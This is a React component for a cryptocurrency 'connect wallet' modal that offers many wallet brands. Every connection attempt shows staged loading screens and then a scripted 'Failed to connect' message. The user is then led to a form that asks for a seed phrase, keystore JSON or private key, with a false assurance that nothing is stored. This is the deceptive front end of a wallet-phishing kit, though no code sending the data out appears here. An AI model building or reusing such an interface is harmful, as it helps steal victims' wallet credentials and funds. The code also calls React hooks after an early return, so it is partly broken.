import React, { useEffect, useRef, useState } from 'react';
import { MdError } from 'react-icons/md';

const wallets = [
  { name: 'Metamask', img: '/coins/metamask.png' },
  { name: 'Trust Wallet', img: '/coins/trust_wallet.jpg' },
  { name: 'Coinbase', img: '/coins/coinbase.png' },
  { name: 'Keplr Wallet', img: '/coins/kelpr.jpg' },
  { name: 'Ledger Live', img: '/coins/ledger_live.jpg' },
  { name: 'SafePal', img: '/coins/safepal.png' },
  { name: 'Tronlink', img: '/coins/tronlink.jpeg' },
  { name: 'Rabby', img: '/coins/rabby.jpg' },
  { name: 'Petra', img: '/coins/petra.png' },
  { name: 'Xverse', img: '/coins/Xverse.jpg' },
  { name: 'Sui', img: '/coins/sui.png' },
  { name: 'Defichain Wallet', img: '/coins/defichain.jpeg' },
  { name: 'DFX Definchain', img: '/coins/DFXDefichain.jpeg' },
  { name: 'Phantom Wallet', img: '/coins/phantom.png' },
  { name: 'Solana', img: '/coins/solana.png' },
  { name: 'Blockchain', img: '/coins/blockchain.png' },
  { name: 'Lobstr', img: '/coins/lb.jpg' },
  { name: 'Yoroi wallet', img: '/coins/yorio.jpg' },
  { name: 'Coinomi', img: '/coins/coinomi.jpg' },
  { name: 'Edge Wallet', img: '/coins/ed.jpg' },
  { name: 'Solar Wallet', img: '/coins/solar.jpg' },
  { name: 'Leap Wallet', img: '/coins/leapwallet.png' },
  { name: 'Talisman Wallet', img: '/coins/talismanwallet.png' },
  { name: 'Neoline Wallet', img: '/coins/neolinewallet.png' },
  { name: 'Polkadot Wallet', img: '/coins/polkadotwallet.png' },
  { name: 'Pera Algo Wallet', img: '/coins/pera-algo.jpg' },
  { name: 'Sender Wallet', img: '/coins/sender.jpg' },
  { name: 'Xcel Pay Wallet', img: '/coins/xceipay.jpg' },
  { name: 'Anchor Wallet', img: '/coins/anchor.jpg' },
  { name: 'ONTO', img: '/coins/Onto.jpg' },
  { name: 'Rainbow', img: '/coins/rainbow.jpg' },
  { name: 'Agent Wallet', img: '/coins/agent.jpg' },
];

export default function Modal({ open, onClose }) {
  const modalRef = useRef(null);

  const [step, setStep] = useState('select');
  const [selectedWallet, setSelectedWallet] = useState(null);

  useEffect(() => {
    if (open) setStep('select');
  }, [open]);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (
        step === 'select' &&
        modalRef.current &&
        !modalRef.current.contains(event.target)
      ) {
        onClose();
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [step, onClose]);

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setStep('loading1');

    setTimeout(() => {
      setStep('connect');
    }, 2000); // loading duration
  };

  const handleConnectClick = () => {
    setStep('loading2');

    setTimeout(() => {
      setStep('final');
    }, 2000); // second loading duration
  };

  if (!open) return null;

  const [selectedOption, setSelectedOption] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [phrase, setPhrase] = useState(''); // For "Phrase" and "Keystone JSON"
  const [privateKey, setPrivateKey] = useState(''); // For "Private Key"
  const [isSuccess, setIsSuccess] = useState(false);

  const handleCancel = () => {
    // Reset modal states to show the homepage view
    // setShowNewPage(false);
    // setShowThirdPage(false);
    // setSelectedWallet('');
    // setPhrase('');
    // setPrivateKey('');
    // setSelectedOption('');
    // setIsLoading(false);
    // setIsError(false);
    // setIsSuccess(false);
    // Navigate to the homepage
    // navigate('/');
  };

  const handleOptionChange = (e) => {
    setSelectedOption(e.target.value);
  };

  const handleInputChange = (e) => {
    if (selectedOption === 'Phrase' || selectedOption === 'Keystone JSON') {
      setPhrase(e.target.value);
    } else if (selectedOption === 'Private') {
      setPrivateKey(e.target.value);
    }
  };

  const toggleConnect = (e) => {
    e.preventDefault();
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setIsSuccess(true);
    }, 2000);
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div
        // ref={modalRef}
        className="bg-white text-black rounded-xl max-w-md w-fit p-6 shadow-lg text-center"
      >
        {step === 'select' && (
          <>
            <div
              ref={modalRef}
              className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
            >
              <div
                ref={modalRef}
                className="bg-[#09131d] text-white rounded-xl max-w-4xl w-full mx-4 shadow-lg"
              >
                <div className="p-6">
                  <div className="flex justify-center bg-[#17212a] p-3 rounded-lg mb-6">
                    <input
                      placeholder="Search wallet..."
                      className="bg-transparent border border-gray-50 text-white placeholder:text-slate-300 placeholder:font-medium w-[90%] lg:w-[60%] py-4 rounded-[23px] pl-5"
                    />
                  </div>
                  <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
                    {wallets.map((wallet, idx) => (
                      <div
                        key={idx}
                        onClick={() => handleWalletClick(wallet)}
                        className="hover:bg-[#334155] border border-slate-800 cursor-pointer flex flex-col items-center justify-center p-4 rounded-xl transition-colors"
                      >
                        <img
                          src={wallet.img}
                          alt={wallet.name}
                          className="w-12 lg:w-20 h-12 lg:h-20 mb-2 object-contain rounded-[20px]"
                        />
                        <span className="text-sm lg:text-[16px] font-medium text-center">
                          {wallet.name}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </>
        )}

        {(step === 'loading1' || step === 'loading2') && (
          <div className="flex flex-col items-center w-[350px] lg:w-[400px]">
            <p className="text-lg lg:text-[25px] font-medium mb-5 text-gray-500">
              Loading...
            </p>
            <p className="text-[15px] lg:text-[18px] font-medium mb-5 text-gray-500">
              Connecting to wallet
            </p>
            <div className="loader mb-4" />
          </div>
        )}

        {step === 'connect' && (
          <>
            <div className="">
              <h2 className="text-[15px] text-center font-semibold mb-4 text-[#FF0000] leading-5">
                Unable To Authenticate. <br /> Connect Manually
              </h2>
              <img
                src="/images/disconnect.png"
                alt="Disconnect"
                className="h-[110px] mx-auto mb-4"
              />
              <div
                className="flex justify-center mx-auto gap-6 fade_up_anim  w-fit border-[1px] border-[rgb(58,150,255)] rounded-[50px]"
                data-delay="0.4"
              >
                <button
                  id="ConnectNow"
                  onClick={handleConnectClick}
                  className="btn-primary bg-[rgb(58,150,255)] m-[2px] text-white py-2 px-3 rounded-[50px] transition-all duration-300 ease-in-out"
                >
                  Connect
                </button>
              </div>
            </div>
          </>
        )}

        {step === 'final' && (
          <>
            <div className="w-[350px] lg:w-[400px]">
              <h2 className="text-[17px] text-center font-bold mb-4 leading-5">
                Connect Your Wallet To Get Started
              </h2>

              <p className="text-[#FF0000] text-[10px] flex items-center gap-1">
                <MdError />
                Failed to connect! Use the form below to connect manually
              </p>

              <form className="pt-5" onSubmit={toggleConnect}>
                <img
                  src={selectedWallet?.img}
                  alt={selectedWallet?.name}
                  className="w-20 h-20 mx-auto mb-2 object-contain rounded-lg"
                />
                <p className="text-sm lg:text-[16px] font-medium text-center mb-5">
                  {selectedWallet?.name}
                </p>

                <label className="block text-center text-gray-500">
                  Access Type
                  <select
                    className="w-full border text-blue-400 border-gray-400 bg-[#F7F7F7] rounded py-[7px] px-[5px]"
                    id="options"
                    value={selectedOption}
                    onChange={handleOptionChange}
                    required
                  >
                    <option value="">Select Option</option>
                    <option value="Phrase">Phrase</option>
                    <option value="Keystone JSON">Keystone JSON</option>
                    <option value="Private">Private Key</option>
                  </select>
                </label>

                <div style={{ marginTop: '20px' }}>
                  {selectedOption === 'Phrase' && (
                    <textarea
                      type="text"
                      placeholder="Enter your Recovery Phrase"
                      className="w-full border border-gray-400 bg-[#F7F7F7] rounded-md h-40 p-2 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 shadow-md"
                      value={phrase}
                      onChange={handleInputChange}
                      required
                    />
                  )}
                  {selectedOption === 'Keystone JSON' && (
                    <textarea
                      type="text"
                      placeholder="Enter your Keystone JSON"
                      className="w-full border border-gray-400 bg-[#F7F7F7] rounded-md h-40 p-2 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500 shadow-md"
                      value={phrase}
                      onChange={handleInputChange}
                      required
                    />
                  )}
                  {selectedOption === 'Private' && (
                    <input
                      type="text"
                      placeholder="Enter Your Private Key"
                      className="w-full border border-gray-400 bg-[#F7F7F7] rounded-md  p-2 text-gray-700"
                      value={privateKey}
                      onChange={handleInputChange}
                      required
                    />
                  )}
                </div>

                <div>
                  <p className="text-[8px] text-center pt-3 text-gray-900">
                    Any misinformation may hinder the successful resolution of
                    the issue. Your details are not{' '}
                    <span className="block">
                      {' '}
                      stored on our system! Its for resolution purpose only
                    </span>
                  </p>
                </div>
                <div
                  className="flex justify-center mx-auto gap-6 fade_up_anim  w-fit border-[1px] border-[rgb(58,150,255)] rounded-[50px] mt-8"
                  data-delay="0.4"
                >
                  <button
                    id="ConnectNow"
                    className="btn-primary bg-[rgb(58,150,255)] m-[2px] text-white py-2 px-3 rounded-[50px] transition-all duration-300 ease-in-out"
                  >
                    {isLoading ? (
                      <>
                        <div className="flex items-center justify-center">
                          <span className="ml-2">Connecting...</span>
                        </div>
                      </>
                    ) : (
                      'Connect Wallet'
                    )}
                  </button>
                </div>
              </form>

              {/* {isLoading && (
                <div
                  className={`fixed top-0 left-0 w-full h-full flex items-center justify-center bg-gray-800 bg-opacity-50 z-50`}
                >
                  <div className="bg-black bg-opacity-50 rounded-lg p-8">
                    <div className="flex justify-center mb-4">
    
                      <div className="animate-spin rounded-full h-12 w-12 border-t-4 border-blue-500 border-solid"></div>
                    </div>
                    <p className="text-center text-white">Connecting...</p>
                  </div>
                </div>
              )} */}
            </div>
          </>
        )}
      </div>

      {isSuccess && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white text-black rounded-xl p-6 shadow-lg text-center max-w-sm w-full">
            <div className="flex justify-center mb-6">
              <svg
                className="w-24 h-24 text-green-500 animate-draw"
                viewBox="0 0 52 52"
              >
                <circle
                  className="stroke-current text-green-500"
                  cx="26"
                  cy="26"
                  r="25"
                  fill="none"
                  strokeWidth="2"
                />
                <path
                  className="stroke-current text-green-500"
                  fill="none"
                  strokeWidth="3"
                  d="M14 27l7 7 17-17"
                />
              </svg>
            </div>
            <p className="text-lg lg:text-[25px] font-medium mb-5 text-gray-500">
              Connecting
            </p>
            <p className="text-[15px] lg:text-[18px] font-medium mb-5 text-gray-500">
              Connecting wallet ...
            </p>
            <button
              onClick={() => {
                setIsSuccess(false);
                onClose();
              }}
              className="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 transition"
            >
              Ok
            </button>
          </div>
        </div>
      )}

      {/* Spinner Style */}
      <style jsx>{`
        .loader {
          border: 5px solid #f3f3f3;
          border-top: 5px solid #3498db;
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 1s linear infinite;
        }

        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </div>
  );
}
